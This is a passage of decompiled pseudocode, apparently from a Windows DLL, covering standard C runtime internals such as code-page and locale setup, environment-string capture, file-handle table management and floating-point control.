    "        && _InterlockedExchangeAdd((volatile signed __int32 *)v4, 0xFFFFFFFF) == 1",
    "        && v4 != (XSAVE_FORMAT *)&unk_18004B760 )",
    "      {",
    "        sub_180023374(v4);",
    "      }",
    "      v5 = *a2;",
    "      *(_QWORD *)(a1 + 136) = *a2;",
    "      _InterlockedIncrement(v5);",
    "      v4 = (XSAVE_FORMAT *)v5;",
    "    }",
    "    sub_180020A3C(5);",
    "  }",
    "  if ( !v4 )",
    "    sub_1800219B0();",
    "  return v4;",
    "}",
    "",
    "",
    "char sub_18002D78C()",
    "{",
    "  __int64 v0; // rax",
    "",
    "  if ( !byte_18004DDCC )",
    "  {",
    "    qword_18004DDB8 = (__int64)&unk_18004BAA0;",
    "    *(_QWORD *)&qword_18004DDC0.ControlWord = &unk_18004B760;",
    "    qword_18004DDB0 = (__int64)&unk_18004B990;",
    "    v0 = sub_1800263D0();",
    "    sub_18002D464(0xFFFFFFFD, 1, v0, &qword_18004DDC0);",
    "    byte_18004DDCC = 1;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "XSAVE_FORMAT *sub_18002D7EC()",
    "{",
    "  __int64 v0; // rax",
    "",
    "  v0 = sub_1800262FC();",
    "  return sub_18002D6D4(v0, (volatile signed __int32 **)&qword_18004DDC0);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002D808(UINT a1, __int64 a2)",
    "{",
    "  const wchar_t *v3; // rbx",
    "  UINT v4; // edi",
    "  unsigned int v5; // r14d",
    "  _DWORD *v6; // rax",
    "  int v7; // ebp",
    "  _WORD *v8; // rdi",
    "  __int64 j; // rcx",
    "  bool v10; // zf",
    "  unsigned __int8 *i; // rcx",
    "  unsigned int v12; // eax",
    "  unsigned int v13; // edx",
    "  __int64 v14; // rdi",
    "  __int64 v15; // rdx",
    "  _BYTE *v16; // rax",
    "  __int64 v17; // rcx",
    "  const wchar_t *v18; // rax",
    "  __int64 v20; // rax",
    "  _BYTE *v21; // r11",
    "  __int64 v22; // r14",
    "  char *v23; // r9",
    "  unsigned __int8 *v24; // rdx",
    "  unsigned int v25; // r8d",
    "  __int64 v26; // r10",
    "  UINT v27; // edi",
    "  UINT v28; // edi",
    "  UINT v29; // edi",
    "  __int16 *v30; // rdi",
    "  _WORD *v31; // rdx",
    "  __int64 v32; // rcx",
    "  __int16 v33; // ax",
    "  _BYTE CPInfo[24]; // [rsp+20h] [rbp-48h] BYREF",
    "",
    "  v3 = 0;",
    "  v4 = sub_18002D164(a1);",
    "  if ( !v4 )",
    "  {",
    "LABEL_57:",
    "    sub_18002D1E4(a2);",
    "    return 0;",
    "  }",
    "  v5 = 0;",
    "  v6 = &unk_18004BBB0;",
    "  v7 = 1;",
    "  do",
    "  {",
    "    if ( *v6 == v4 )",
    "    {",
    "      sub_1800368A0(a2 + 24, 0, 257);",
    "      v20 = v5;",
    "      v21 = &unk_18004BBA0;",
    "      v22 = 4;",
    "      v23 = (char *)&unk_18004BBC0 + 48 * v20;",
    "      do",
    "      {",
    "        v24 = (unsigned __int8 *)v23;",
    "        if ( *v23 )",
    "        {",
    "          do",
    "          {",
    "            if ( !v24[1] )",
    "              break;",
    "            v25 = *v24;",
    "            if ( v25 <= v24[1] )",
    "            {",
    "              v26 = v25 + 1;",
    "              do",
    "              {",
    "                if ( (unsigned int)v26 >= 0x101 )",
    "                  break;",
    "                ++v25;",
    "                *(_BYTE *)(v26 + a2 + 24) |= *v21;",
    "                v26 = (unsigned int)(v26 + 1);",
    "              }",
    "              while ( v25 <= v24[1] );",
    "            }",
    "            v24 += 2;",
    "          }",
    "          while ( *v24 );",
    "        }",
    "        v23 += 8;",
    "        ++v21;",
    "        --v22;",
    "      }",
    "      while ( v22 );",
    "      *(_DWORD *)(a2 + 4) = v4;",
    "      *(_DWORD *)(a2 + 8) = 1;",
    "      v27 = v4 - 932;",
    "      if ( v27 )",
    "      {",
    "        v28 = v27 - 4;",
    "        if ( v28 )",
    "        {",
    "          v29 = v28 - 13;",
    "          if ( v29 )",
    "          {",
    "            if ( v29 == 1 )",
    "              v3 = L\"zh-TW\";",
    "          }",
    "          else",
    "          {",
    "            v3 = L\"ko-KR\";",
    "          }",
    "        }",
    "        else",
    "        {",
    "          v3 = L\"zh-CN\";",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v3 = L\"ja-JP\";",
    "      }",
    "      *(_QWORD *)(a2 + 544) = v3;",
    "      v30 = (__int16 *)((char *)&unk_18004BBB4 + 48 * v20);",
    "      v31 = (_WORD *)(a2 + 12);",
    "      v32 = 6;",
    "      do",
    "      {",
    "        v33 = *v30++;",
    "        *v31++ = v33;",
    "        --v32;",
    "      }",
    "      while ( v32 );",
    "      goto LABEL_56;",
    "    }",
    "    ++v5;",
    "    v6 += 12;",
    "  }",
    "  while ( v5 < 5 );",
    "  if ( v4 == 65000 || !IsValidCodePage((unsigned __int16)v4) )",
    "    return 0xFFFFFFFFLL;",
    "  if ( v4 == 65001 )",
    "  {",
    "    *(_QWORD *)(a2 + 4) = 65001;",
    "    *(_QWORD *)(a2 + 544) = 0;",
    "    *(_DWORD *)(a2 + 24) = 0;",
    "    *(_WORD *)(a2 + 28) = 0;",
    "    goto LABEL_9;",
    "  }",
    "  if ( !GetCPInfo(v4, (LPCPINFO)CPInfo) )",
    "  {",
    "    if ( dword_18004DDC8 )",
    "      goto LABEL_57;",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "  sub_1800368A0(a2 + 24, 0, 257);",
    "  v10 = *(_DWORD *)CPInfo == 2;",
    "  *(_DWORD *)(a2 + 4) = v4;",
    "  *(_QWORD *)(a2 + 544) = 0;",
    "  if ( v10 )",
    "  {",
    "    for ( i = &CPInfo[6]; *i; i += 2 )",
    "    {",
    "      if ( !i[1] )",
    "        break;",
    "      v12 = i[1];",
    "      v13 = *i;",
    "      if ( v13 <= v12 )",
    "      {",
    "        v14 = v13 + 1;",
    "        v15 = v12 - v13 + 1;",
    "        do",
    "        {",
    "          *(_BYTE *)(v14 + a2 + 24) |= 4u;",
    "          v14 = (unsigned int)(v14 + 1);",
    "          --v15;",
    "        }",
    "        while ( v15 );",
    "      }",
    "    }",
    "    v16 = (_BYTE *)(a2 + 26);",
    "    v17 = 254;",
    "    do",
    "    {",
    "      *v16++ |= 8u;",
    "      --v17;",
    "    }",
    "    while ( v17 );",
    "    switch ( *(_DWORD *)(a2 + 4) )",
    "    {",
    "      case 0x3A4:",
    "        v18 = L\"ja-JP\";",
    "        break;",
    "      case 0x3A8:",
    "        v18 = L\"zh-CN\";",
    "        break;",
    "      case 0x3B5:",
    "        v18 = L\"ko-KR\";",
    "        break;",
    "      case 0x3B6:",
    "        v18 = L\"zh-TW\";",
    "        break;",
    "      default:",
    "        v18 = 0;",
    "        break;",
    "    }",
    "    *(_QWORD *)(a2 + 544) = v18;",
    "  }",
    "  else",
    "  {",
    "    v7 = 0;",
    "  }",
    "  *(_DWORD *)(a2 + 8) = v7;",
    "LABEL_9:",
    "  v8 = (_WORD *)(a2 + 12);",
    "  for ( j = 6; j; --j )",
    "    *v8++ = 0;",
    "LABEL_56:",
    "  sub_18002D27C(a2);",
    "  return 0;",
    "}",
    "",
    "",
    "_BOOL8 __fastcall sub_18002DAC8(__int128 *a1, unsigned __int8 a2, int a3, unsigned __int8 a4)",
    "{",
    "  _BOOL8 result; // rax",
    "  _QWORD v8[3]; // [rsp+20h] [rbp-28h] BYREF",
    "  char v9; // [rsp+38h] [rbp-10h]",
    "",
    "  sub_18001B674(v8, a1);",
    "  result = (a4 & *(_BYTE *)(a2 + v8[2] + 25LL)) != 0",
    "        || a3 && (*(_WORD *)(*(_QWORD *)v8[1] + 2LL * a2) & (unsigned __int16)a3) != 0;",
    "  if ( v9 )",
    "    *(_DWORD *)(v8[0] + 936LL) &= ~2u;",
    "  return result;",
    "}",
    "",
    "",
    "_BOOL8 __fastcall sub_18002DB3C(unsigned __int8 a1)",
    "{",
    "  return sub_18002DAC8(0, a1, 0, 4u);",
    "}",
    "",
    "",
    "char sub_18002DB50()",
    "{",
    "  qword_18004DDF0 = (__int64)GetCommandLineA();",
    "  qword_18004DDF8 = (__int64)GetCommandLineW();",
    "  return 1;",
    "}",
    "",
    "",
    "XSAVE_FORMAT *sub_18002DB78()",
    "{",
    "  LPWCH EnvironmentStringsW; // rax",
    "  XSAVE_FORMAT *v1; // rsi",
    "  WCHAR *v2; // rbx",
    "  char *v4; // rbp",
    "  __int64 v5; // rax",
    "  __int64 v6; // rbp",
    "  int v7; // eax",
    "  int v8; // r14d",
    "  CHAR *v9; // rax",
    "  XSAVE_FORMAT *v10; // rdi",
    "",
    "  EnvironmentStringsW = GetEnvironmentStringsW();",
    "  v1 = 0;",
    "  v2 = EnvironmentStringsW;",
    "  if ( !EnvironmentStringsW )",
    "    return 0;",
    "  v4 = (char *)EnvironmentStringsW;",
    "  if ( *EnvironmentStringsW )",
    "  {",
    "    do",
    "    {",
    "      v5 = -1;",
    "      do",
    "        ++v5;",
    "      while ( *(_WORD *)&v4[2 * v5] );",
    "      v4 += 2 * v5 + 2;",
    "    }",
    "    while ( *(_WORD *)v4 );",
    "  }",
    "  v6 = (v4 - (char *)v2 + 2) >> 1;",
    "  v7 = sub_18002C260(0, 0, v2, v6, 0, 0, 0, 0);",
    "  v8 = v7;",
    "  if ( !v7 )",
    "  {",
    "LABEL_8:",
    "    FreeEnvironmentStringsW(v2);",
    "    return 0;",
    "  }",
    "  v9 = (CHAR *)sub_180024B50(v7);",
    "  v10 = (XSAVE_FORMAT *)v9;",
    "  if ( !v9 )",
    "  {",
    "    sub_180023374(0);",
    "    goto LABEL_8;",
    "  }",
    "  if ( sub_18002C260(0, 0, v2, v6, v9, v8, 0, 0) )",
    "  {",
    "    sub_180023374(0);",
    "    v1 = v10;",
    "  }",
    "  else",
    "  {",
    "    sub_180023374(v10);",
    "  }",
    "  FreeEnvironmentStringsW(v2);",
    "  return v1;",
    "}",
    "",
    "",
    "char *__fastcall sub_18002DC88(XSAVE_FORMAT *a1, unsigned __int64 a2, unsigned __int64 a3)",
    "{",
    "  unsigned __int64 v7; // rdi",
    "  unsigned __int64 v8; // rbx",
    "  char *v9; // rax",
    "  char *v10; // rsi",
    "",
    "  if ( a2 && 0xFFFFFFFFFFFFFFE0uLL / a2 < a3 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 12;",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    if ( a1 )",
    "      v7 = sub_18003450C();",
    "    else",
    "      v7 = 0;",
    "    v8 = a3 * a2;",
    "    v9 = (char *)sub_18002BE40(a1, (M128A *)v8);",
    "    v10 = v9;",
    "    if ( v9 )",
    "    {",
    "      if ( v7 < v8 )",
    "        sub_1800368A0(&v9[v7], 0, v8 - v7);",
    "    }",
    "    return v10;",
    "  }",
    "}",
    "",
    "",
    "bool sub_18002DD20()",
    "{",
    "  hHeap = GetProcessHeap();",
    "  return hHeap != 0;",
    "}",
    "",
    "",
    "char __fastcall sub_18002DD48(unsigned __int8 (**a1)(void), unsigned __int8 (**a2)(void))",
    "{",
    "  unsigned __int8 (**v4)(void); // rbx",
    "  unsigned __int8 (**v5)(void); // rbx",
    "",
    "  if ( a1 == a2 )",
    "    return 1;",
    "  v4 = a1;",
    "  do",
    "  {",
    "    if ( *v4 && !(*v4)() )",
    "      break;",
    "    v4 += 2;",
    "  }",
    "  while ( v4 != a2 );",
    "  if ( v4 == a2 )",
    "    return 1;",
    "  if ( v4 != a1 )",
    "  {",
    "    v5 = v4 - 1;",
    "    do",
    "    {",
    "      if ( *(v5 - 1) )",
    "      {",
    "        if ( *v5 )",
    "          ((void (__fastcall *)(_QWORD))*v5)(0);",
    "      }",
    "      v5 -= 2;",
    "    }",
    "    while ( v5 + 1 != a1 );",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "char __fastcall sub_18002DDDC(__int64 a1, __int64 a2)",
    "{",
    "  __int64 i; // rbx",
    "  void (__fastcall *v4)(_QWORD); // rax",
    "",
    "  for ( i = a2; i != a1; i -= 16 )",
    "  {",
    "    v4 = *(void (__fastcall **)(_QWORD))(i - 8);",
    "    if ( v4 )",
    "      v4(0);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "bool sub_18002DE24()",
    "{",
    "  return __ROR8__(_security_cookie ^ qword_18004DE08, _security_cookie & 0x3F) != 0;",
    "}",
    "",
    "",
    "void __fastcall sub_18002DE44(__int64 a1)",
    "{",
    "  qword_18004DE08 = a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002DE4C(__int64 a1)",
    "{",
    "  __int64 (__fastcall *v1)(__int64); // rdx",
    "",
    "  v1 = (__int64 (__fastcall *)(__int64))__ROR8__(_security_cookie ^ qword_18004DE08, _security_cookie & 0x3F);",
    "  if ( v1 )",
    "    return v1(a1);",
    "  else",
    "    return 0;",
    "}",
    "",
    "",
    "__int64 sub_18002DE88()",
    "{",
    "  return (unsigned int)dword_18004DE10;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002DE90(int a1, _WORD *a2, int a3)",
    "{",
    "  __int64 v3; // rdi",
    "  int v6; // r9d",
    "  int v7; // r10d",
    "  int v8; // eax",
    "  __int64 v9; // rcx",
    "  int v10; // edx",
    "  int v11; // ecx",
    "  int v12; // eax",
    "  __m128i *v14; // rbp",
    "  int v15; // eax",
    "  int v16; // ebx",
    "",
    "  v3 = a3;",
    "  if ( (a1 & 0xFFFFF3FF) == 0 && a1 != 3072 || !a2 && (int)v3 > 0 || (int)v3 < 0 )",
    "    return 0;",
    "  v6 = 0;",
    "  v7 = 227;",
    "  while ( 1 )",
    "  {",
    "    v8 = (v7 + v6) / 2;",
    "    v9 = 4LL * v8;",
    "    v10 = a1 - dword_18003E930[v9];",
    "    if ( a1 == dword_18003E930[v9] )",
    "      break;",
    "    v11 = v8 - 1;",
    "    if ( v10 >= 0 )",
    "      v11 = v7;",
    "    v12 = v8 + 1;",
    "    v7 = v11;",
    "    if ( v10 >= 0 )",
    "      v6 = v12;",
    "    if ( v6 > v11 )",
    "      return 0;",
    "  }",
    "  if ( v8 < 0 )",
    "    return 0;",
    "  v14 = *(__m128i **)&dword_18003E930[4 * v8 + 2];",
    "  v15 = sub_180021E08(v14, 0x55u);",
    "  v16 = v15;",
    "  if ( (int)v3 > 0 )",
    "  {",
    "    if ( v15 < (int)v3 )",
    "    {",
    "      if ( (unsigned int)sub_18002BA78(a2, v3, (__int64)v14) )",
    "      {",
    "        sub_18001A6B4();",
    "        JUMPOUT(0x18002DF74LL);",
    "      }",
    "      return (unsigned int)(v16 + 1);",
    "    }",
    "    return 0;",
    "  }",
    "  return (unsigned int)(v16 + 1);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002DF78(__int64 a1)",
    "{",
    "  int v2; // ebx",
    "  int v3; // edi",
    "  __int64 v4; // rsi",
    "  int v5; // eax",
    "  unsigned __int64 v7; // rax",
    "",
    "  if ( !a1 )",
    "    return 0;",
    "  v2 = 0;",
    "  v3 = 227;",
    "  while ( 1 )",
    "  {",
    "    v4 = (v3 + v2) / 2;",
    "    v5 = sub_180032C60(a1, *(&off_180040390 + 2 * v4), 85);",
    "    if ( !v5 )",
    "      break;",
    "    if ( v5 >= 0 )",
    "      v2 = v4 + 1;",
    "    else",
    "      v3 = v4 - 1;",
    "    if ( v2 > v3 )",
    "      return 0;",
    "  }",
    "  v7 = dword_180040398[4 * v4];",
    "  if ( (v7 & 0x80000000) == 0LL && v7 < 0xE4 )",
    "    return (unsigned int)dword_18003E930[4 * v7];",
    "  else",
    "    return 0;",
    "}",
    "",
    "",
    "char *sub_18002E01C()",
    "{",
    "  char *v0; // rax",
    "  char *v1; // rsi",
    "  char *v2; // rbx",
    "  char *v3; // rbp",
    "  char *v4; // rdi",
    "  _BYTE *v5; // rcx",
    "  unsigned int v6; // eax",
    "",
    "  v0 = (char *)sub_1800232FC(0x40u, 0x48u);",
    "  v1 = 0;",
    "  v2 = v0;",
    "  if ( v0 )",
    "  {",
    "    v3 = v0 + 4608;",
    "    v4 = v0 + 48;",
    "    do",
    "    {",
    "      sub_180023878((LPCRITICAL_SECTION)(v4 - 48), (PCONTEXT)0xFA0, 0);",
    "      *((_QWORD *)v4 - 1) = -1;",
    "      v5 = v4 + 14;",
    "      v4[13] &= 0xF8u;",
    "      v6 = 0;",
    "      *(_QWORD *)v4 = 0;",
    "      *((_DWORD *)v4 + 2) = 168427520;",
    "      v4[12] = 10;",
    "      do",
    "      {",
    "        *v5 = 0;",
    "        ++v6;",
    "        ++v5;",
    "      }",
    "      while ( v6 < 5 );",
    "      v4 += 72;",
    "    }",
    "    while ( v4 - 48 != v3 );",
    "    v1 = v2;",
    "  }",
    "  sub_180023374(0);",
    "  return v1;",
    "}",
    "",
    "",
    "void __fastcall sub_18002E0C4(XSAVE_FORMAT *lpCriticalSection)",
    "{",
    "  struct _RTL_CRITICAL_SECTION *v1; // rsi",
    "  struct _RTL_CRITICAL_SECTION *v3; // rdi",
    "",
    "  if ( lpCriticalSection )",
    "  {",
    "    v1 = (struct _RTL_CRITICAL_SECTION *)&lpCriticalSection[9];",
    "    v3 = (struct _RTL_CRITICAL_SECTION *)lpCriticalSection;",
    "    do",
    "    {",
    "      DeleteCriticalSection(v3);",
    "      v3 = (struct _RTL_CRITICAL_SECTION *)((char *)v3 + 72);",
    "    }",
    "    while ( v3 != v1 );",
    "    sub_180023374(lpCriticalSection);",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002E114(unsigned int a1)",
    "{",
    "  unsigned int v3; // edi",
    "  __int64 v4; // rbx",
    "  int v5; // eax",
    "  char *v6; // rax",
    "",
    "  if ( a1 < 0x2000 )",
    "  {",
    "    v3 = 0;",
    "    sub_1800209E8(7);",
    "    v4 = 0;",
    "    v5 = dword_18004DC70;",
    "    while ( (int)a1 >= v5 )",
    "    {",
    "      if ( !qword_18004D870[v4] )",
    "      {",
    "        v6 = sub_18002E01C();",
    "        qword_18004D870[v4] = (__int64)v6;",
    "        if ( !v6 )",
    "        {",
    "          v3 = 12;",
    "          break;",
    "        }",
    "        v5 = dword_18004DC70 + 64;",
    "        dword_18004DC70 += 64;",
    "      }",
    "      ++v4;",
    "    }",
    "    sub_180020A3C(7);",
    "    return v3;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 9;",
    "    invalid_parameter_noinfo();",
    "    return 9;",
    "  }",
    "}",
    "",
    "",
    "void __fastcall sub_18002E1BC(int a1)",
    "{",
    "  EnterCriticalSection((LPCRITICAL_SECTION)(qword_18004D870[(__int64)a1 >> 6] + 72LL * (a1 & 0x3F)));",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002E1E4(int a1, void *a2)",
    "{",
    "  unsigned __int64 v4; // rsi",
    "  __int64 v5; // rbp",
    "  int v6; // ebx",
    "  DWORD v7; // ecx",
    "",
    "  if ( a1 >= 0 && a1 < (unsigned int)dword_18004DC70 )",
    "  {",
    "    v4 = (unsigned __int64)a1 >> 6;",
    "    v5 = 9LL * (a1 & 0x3F);",
    "    if ( *(_QWORD *)(qword_18004D870[v4] + 72LL * (a1 & 0x3F) + 40) == -1 )",
    "    {",
    "      if ( (unsigned int)sub_180034548() == 1 )",
    "      {",
    "        if ( !a1 )",
    "        {",
    "          v7 = -10;",
    "          goto LABEL_11;",
    "        }",
    "        v6 = a1 - 1;",
    "        if ( !v6 )",
    "        {",
    "          v7 = -11;",
    "          goto LABEL_11;",
    "        }",
    "        if ( v6 == 1 )",
    "        {",
    "          v7 = -12;",
    "LABEL_11:",
    "          SetStdHandle(v7, a2);",
    "        }",
    "      }",
    "      *(_QWORD *)(qword_18004D870[v4] + 8 * v5 + 40) = a2;",
    "      return 0;",
    "    }",
    "  }",
    "  *(_DWORD *)sub_18001A80C() = 9;",
    "  *(_DWORD *)sub_18001A7EC() = 0;",
    "  return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "void __fastcall sub_18002E2A4(int a1)",
    "{",
    "  LeaveCriticalSection((LPCRITICAL_SECTION)(qword_18004D870[(__int64)a1 >> 6] + 72LL * (a1 & 0x3F)));",
    "}",
    "",
    "",
    "__int64 sub_18002E2CC()",
    "{",
    "  unsigned int v0; // r14d",
    "  int i; // ebx",
    "  __int64 v2; // rsi",
    "  char *v3; // rax",
    "  int v4; // ebx",
    "  __int64 j; // rdi",
    "  int v6; // edx",
    "  __int64 v7; // r8",
    "  __int64 v8; // rcx",
    "",
    "  sub_1800209E8(7);",
    "  v0 = -1;",
    "  for ( i = 0; i < 128; ++i )",
    "  {",
    "    v2 = qword_18004D870[i];",
    "    if ( !v2 )",
    "    {",
    "      v3 = sub_18002E01C();",
    "      qword_18004D870[i] = (__int64)v3;",
    "      if ( v3 )",
    "      {",
    "        dword_18004DC70 += 64;",
    "        v4 = i << 6;",
    "        sub_18002E1BC(v4);",
    "        *(_BYTE *)(qword_18004D870[(__int64)v4 >> 6] + 56) = 1;",
    "        v0 = v4;",
    "      }",
    "      break;",
    "    }",
    "    for ( j = qword_18004D870[i]; j != v2 + 4608; j += 72 )",
    "    {",
    "      if ( (*(_BYTE *)(j + 56) & 1) == 0 )",
    "      {",
    "        EnterCriticalSection((LPCRITICAL_SECTION)j);",
    "        if ( (*(_BYTE *)(j + 56) & 1) == 0 )",
    "        {",
    "          v6 = (i << 6) + ((int)j - (int)v2) / 72;",
    "          v7 = (__int64)v6 >> 6;",
    "          v8 = 9LL * (v6 & 0x3F);",
    "          *(_BYTE *)(qword_18004D870[v7] + 8 * v8 + 56) = 1;",
    "          *(_QWORD *)(qword_18004D870[v7] + 8 * v8 + 40) = -1;",
    "          v0 = v6;",
    "          goto LABEL_14;",
    "        }",
    "        LeaveCriticalSection((LPCRITICAL_SECTION)j);",
    "      }",
    "    }",
    "  }",
    "LABEL_14:",
    "  sub_180020A3C(7);",
    "  return v0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002E40C(int a1)",
    "{",
    "  unsigned __int64 v2; // rsi",
    "  __int64 v3; // rdi",
    "  __int64 v4; // rax",
    "  int v5; // ebx",
    "  DWORD v6; // ecx",
    "",
    "  if ( a1 >= 0 && a1 < (unsigned int)dword_18004DC70 )",
    "  {",
    "    v2 = (unsigned __int64)a1 >> 6;",
    "    v3 = 9LL * (a1 & 0x3F);",
    "    v4 = qword_18004D870[v2];",
    "    if ( (*(_BYTE *)(v4 + 72LL * (a1 & 0x3F) + 56) & 1) != 0 && *(_QWORD *)(v4 + 72LL * (a1 & 0x3F) + 40) != -1 )",
    "    {",
    "      if ( (unsigned int)sub_180034548() == 1 )",
    "      {",
    "        if ( !a1 )",
    "        {",
    "          v6 = -10;",
    "          goto LABEL_12;",
    "        }",
    "        v5 = a1 - 1;",
    "        if ( !v5 )",
    "        {",
    "          v6 = -11;",
    "          goto LABEL_12;",
    "        }",
    "        if ( v5 == 1 )",
    "        {",
    "          v6 = -12;",
    "LABEL_12:",
    "          SetStdHandle(v6, 0);",
    "        }",
    "      }",
    "      *(_QWORD *)(qword_18004D870[v2] + 8 * v3 + 40) = -1;",
    "      return 0;",
    "    }",
    "  }",
    "  *(_DWORD *)sub_18001A80C() = 9;",
    "  *(_DWORD *)sub_18001A7EC() = 0;",
    "  return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002E4C8(int a1)",
    "{",
    "  unsigned __int64 v1; // rax",
    "  __int64 v2; // rcx",
    "  __int64 v3; // rax",
    "",
    "  if ( a1 == -2 )",
    "  {",
    "    *(_DWORD *)sub_18001A7EC() = 0;",
    "    *(_DWORD *)sub_18001A80C() = 9;",
    "  }",
    "  else",
    "  {",
    "    if ( a1 >= 0 && a1 < (unsigned int)dword_18004DC70 )",
    "    {",
    "      v1 = a1;",
    "      v2 = a1 & 0x3F;",
    "      v3 = qword_18004D870[v1 >> 6];",
    "      if ( (*(_BYTE *)(v3 + 72 * v2 + 56) & 1) != 0 )",
    "        return *(_QWORD *)(v3 + 72 * v2 + 40);",
    "    }",
    "    *(_DWORD *)sub_18001A7EC() = 0;",
    "    *(_DWORD *)sub_18001A80C() = 9;",
    "    invalid_parameter_noinfo();",
    "  }",
    "  return -1;",
    "}",
    "",
    "",
    "__int64 get_fpsr()",
    "{",
    "  return (unsigned int)_mm_getcsr();",
    "}",
    "",
    "",
    "void __fastcall set_fpsr(unsigned int a1)",
    "{",
    "  _mm_setcsr(a1);",
    "}",
    "",
    "",
    "void fclrf()",
    "{",
    "  _mm_setcsr(_mm_getcsr() & 0xFFFFFFC0);",
    "}",
    "",
    "",
    "void __fastcall sub_18002E5A0(__int64 a1)",
    "{",
    "  volatile signed __int32 *v1; // rax",
    "  volatile signed __int32 *v2; // rax",
    "  volatile signed __int32 *v3; // rax",
    "  volatile signed __int32 *v4; // rax",
    "  volatile signed __int32 **v5; // rax",
    "  __int64 v6; // r8",
    "  volatile signed __int32 *v7; // rdx",
    "",
    "  _InterlockedIncrement((volatile signed __int32 *)(a1 + 16));",
    "  v1 = *(volatile signed __int32 **)(a1 + 224);",
    "  if ( v1 )",
    "    _InterlockedIncrement(v1);",
    "  v2 = *(volatile signed __int32 **)(a1 + 240);",
    "  if ( v2 )",
    "    _InterlockedIncrement(v2);",
    "  v3 = *(volatile signed __int32 **)(a1 + 232);",
    "  if ( v3 )",
    "    _InterlockedIncrement(v3);",
    "  v4 = *(volatile signed __int32 **)(a1 + 256);",
    "  if ( v4 )",
    "    _InterlockedIncrement(v4);",
    "  v5 = (volatile signed __int32 **)(a1 + 56);",
    "  v6 = 6;",
    "  while ( 1 )",
    "  {",
    "    if ( *(v5 - 2) != (volatile signed __int32 *)&unk_18004B4A8 && *v5 )",
    "      _InterlockedIncrement(*v5);",
    "    if ( *(v5 - 3) )",
    "    {",
    "      v7 = *(v5 - 1);",
    "      if ( v7 )",
    "        _InterlockedIncrement(v7);",
    "    }",
    "    v5 += 4;",
    "    if ( !--v6 )",
    "      JUMPOUT(0x18002E7A4LL);",
    "  }",
    "}",
    "",
    "",
    "void __fastcall sub_18002E62C(__int64 a1)",
    "{",
    "  _UNKNOWN **v1; // rax",
    "  _DWORD *v3; // rax",
    "  XSAVE_FORMAT *v4; // rcx",
    "  XSAVE_FORMAT *v5; // rcx",
    "  _DWORD *v6; // rax",
    "  XSAVE_FORMAT **v7; // rsi",
    "  __int64 v8; // rbp",
    "  XSAVE_FORMAT **v9; // rdi",
    "  XSAVE_FORMAT *v10; // rcx",
    "  XSAVE_FORMAT *v11; // rcx",
    "",
    "  v1 = *(_UNKNOWN ***)(a1 + 248);",
    "  if ( v1 )",
    "  {",
    "    if ( v1 != &off_18004B210 )",
    "    {",
    "      v3 = *(_DWORD **)(a1 + 224);",
    "      if ( v3 )",
    "      {",
    "        if ( !*v3 )",
    "        {",
    "          v4 = *(XSAVE_FORMAT **)(a1 + 240);",
    "          if ( v4 && !*(_DWORD *)&v4->ControlWord )",
    "          {",
    "            sub_180023374(v4);",
    "            _free_lconv_mon(*(_QWORD *)(a1 + 248));",
    "          }",
    "          v5 = *(XSAVE_FORMAT **)(a1 + 232);",
    "          if ( v5 && !*(_DWORD *)&v5->ControlWord )",
    "          {",
    "            sub_180023374(v5);",
    "            _free_lconv_num(*(_QWORD *)(a1 + 248));",
    "          }",
    "          sub_180023374(*(XSAVE_FORMAT **)(a1 + 224));",
    "          sub_180023374(*(XSAVE_FORMAT **)(a1 + 248));",
    "        }",
    "      }",
    "    }",
    "  }",
    "  v6 = *(_DWORD **)(a1 + 256);",
    "  if ( v6 && !*v6 )",
    "  {",
    "    sub_180023374((XSAVE_FORMAT *)(*(_QWORD *)(a1 + 264) - 254LL));",
    "    sub_180023374((XSAVE_FORMAT *)(*(_QWORD *)(a1 + 272) - 128LL));",
    "    sub_180023374((XSAVE_FORMAT *)(*(_QWORD *)(a1 + 280) - 128LL));",
    "    sub_180023374(*(XSAVE_FORMAT **)(a1 + 256));",
    "  }",
    "  sub_18002E7CC(*(_QWORD *)(a1 + 288));",
    "  v7 = (XSAVE_FORMAT **)(a1 + 296);",
    "  v8 = 6;",
    "  v9 = (XSAVE_FORMAT **)(a1 + 56);",
    "  do",
    "  {",
    "    if ( *(v9 - 2) != (XSAVE_FORMAT *)&unk_18004B4A8 )",
    "    {",
    "      v10 = *v9;",
    "      if ( *v9 )",
    "      {",
    "        if ( !*(_DWORD *)&v10->ControlWord )",
    "        {",
    "          sub_180023374(v10);",
    "          sub_180023374(*v7);",
    "        }",
    "      }",
    "    }",
    "    if ( *(v9 - 3) )",
    "    {",
    "      v11 = *(v9 - 1);",
    "      if ( v11 )",
    "      {",
    "        if ( !*(_DWORD *)&v11->ControlWord )",
    "          sub_180023374(v11);",
    "      }",
    "    }",
    "    ++v7;",
    "    v9 += 4;",
    "    --v8;",
    "  }",
    "  while ( v8 );",
    "  sub_180023374((XSAVE_FORMAT *)a1);",
    "}",
    "",
    "",
    "void __fastcall sub_18002E7CC(__int64 a1)",
    "{",
    "  if ( a1 && (_UNKNOWN **)a1 != &off_18003E1E0 && !*(_DWORD *)(a1 + 348) )",
    "  {",
    "    sub_180030DF8();",
    "    sub_180023374((XSAVE_FORMAT *)a1);",
    "  }",
    "}",
    "",
    "",
    "void __fastcall sub_18002E82C(__int64 a1)",
    "{",
    "  volatile signed __int32 *v1; // rax",
    "  volatile signed __int32 *v2; // rax",
    "  volatile signed __int32 *v3; // rax",
    "  volatile signed __int32 *v4; // rax",
    "  volatile signed __int32 **v5; // rax",
    "  __int64 v6; // r8",
    "  volatile signed __int32 *v7; // rdx",
    "",
    "  if ( a1 )",
    "  {",
    "    _InterlockedAdd((volatile signed __int32 *)(a1 + 16), 0xFFFFFFFF);",
